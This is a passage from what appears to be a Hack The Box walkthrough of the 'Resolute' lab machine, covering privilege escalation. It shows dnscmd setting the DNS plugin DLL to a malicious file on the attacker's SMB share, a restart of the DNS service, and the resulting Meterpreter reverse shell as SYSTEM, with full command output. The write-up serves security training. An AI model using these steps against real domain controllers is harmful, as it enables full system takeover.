<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed

</code></pre></div><p>Last step of preparation, we run our handler in order to get the incoming connection.</p>
<p>Once this is done, the exploitation is rather fast and have to be fast. Indeed, I&rsquo;m not able to say if it comes from a possible antivirus on the machine, detecting our malicious DLL, or a simple configuration in order to make the machine accessible to everyone, but it turns out that each user seems to have a limited time to exploit the vulnerability once the registry key is set up. After a while, the registry key is cleaned up.</p>
<p>Good! The first step is to tell the DNS server to fetch our malicious DLL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; dnscmd 10.10.10.169 /config /serverlevelplugindll <span style="color:#ae81ff">\\</span>10.10.14.28<span style="color:#ae81ff">\T</span>ESTLOL<span style="color:#ae81ff">\p</span>rivesc.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
</code></pre></div><p>We can confirm the command sucess by inspecting the associated registry key</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; Get-ItemProperty HKLM:<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS<span style="color:#ae81ff">\P</span>arameters<span style="color:#ae81ff">\ </span>-Name ServerLevelPluginDll

ServerLevelPluginDll : <span style="color:#ae81ff">\\</span>10.10.14.28<span style="color:#ae81ff">\T</span>ESTLOL<span style="color:#ae81ff">\p</span>rivesc.dll
PSPath               : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry::HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS<span style="color:#ae81ff">\P</span>arameters<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>PSParentPath         : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry::HKEY_LOCAL_MACHINE<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\S</span>ervices<span style="color:#ae81ff">\D</span>NS
PSChildName          : Parameters
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core<span style="color:#ae81ff">\R</span>egistry
</code></pre></div><p>Then, we have to restart the DNS service in order to let him load the DLL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe stop dns

SERVICE_NAME: dns 
        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
        STATE              : <span style="color:#ae81ff">3</span>  STOP_PENDING 
                                <span style="color:#f92672">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#f92672">)</span>
        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe query dns

SERVICE_NAME: dns 
        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
        STATE              : <span style="color:#ae81ff">1</span>  STOPPED 
        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; sc.exe start dns

SERVICE_NAME: dns 
        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS  
        STATE              : <span style="color:#ae81ff">2</span>  START_PENDING 
                                <span style="color:#f92672">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#f92672">)</span>
        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : <span style="color:#ae81ff">3340</span>
        FLAGS              : 

</code></pre></div><p>And that&rsquo;s how we can get a sweet meterpreter&hellip; :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">206403</span> bytes<span style="color:#f92672">)</span> to 10.10.10.169
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.28:5566 -&gt; 10.10.10.169:63985<span style="color:#f92672">)</span> at 2020-02-22 17:02:49 +0100

msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...

meterpreter &gt; shell
Process <span style="color:#ae81ff">3288</span> created.
Channel <span style="color:#ae81ff">1</span> created.
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;c
</code></pre></div><p>&hellip; Allowing us to compromize the machine and giving us the root flag !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;whoami
whoami
nt authority<span style="color:#ae81ff">\s</span>ystem

C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;hostname
hostname
Resolute

</code></pre></div><p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/en/walkthroughs/hackthebox/forest/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Forest</span>
    </a>
    
    
    <a href="/en/walkthroughs/hackthebox/nest/" class="post--navigation-next">
      <span class="navigation-tittle">Hack The Box - Nest</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
